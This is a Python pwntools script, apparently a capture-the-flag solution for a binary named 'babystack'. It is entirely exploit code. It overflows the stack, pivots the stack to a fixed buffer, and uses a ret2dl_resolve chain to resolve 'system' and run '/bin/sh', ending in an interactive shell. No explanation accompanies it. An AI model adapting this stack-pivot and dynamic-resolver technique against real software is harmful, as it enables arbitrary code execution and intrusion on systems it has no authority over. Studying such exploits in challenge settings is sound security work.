from pwn import *
from roputils import ROP

# config
pr = 0x080482e9# : pop ebx ; ret
ppr = 0x080484ea# : pop edi ; pop ebp ; ret
pppr = 0x080484e9# : pop esi ; pop edi ; pop ebp ; ret
buf = 0x804a500
leave = 0x080483a8# : leave ; ret
pebp = 0x080484eb# : pop ebp ; ret

def packAll(rop):
    return flat([p32(x) for x in rop])

r = process('./babystack')
e = ELF('./babystack')
e2 = ROP('./babystack')

# payload for the stack pivoting
rop = []
rop += [e.plt['read'], leave, 0, buf, 0xc0]
payload1 = 'A'*0x28+p32(buf-4)+packAll(rop)

# payload to do rop
payload2 = ''
payload2 += e2.dl_resolve_call(buf+0x20, buf+0x80)
payload2 = payload2.ljust(0x20, '\x00')
payload2 += e2.dl_resolve_data(buf+0x20, 'system')
payload2 = payload2.ljust(0x80, '\x00')
payload2 += '/bin/sh'

payload = payload1+payload2
r.send(payload)

r.interactive()
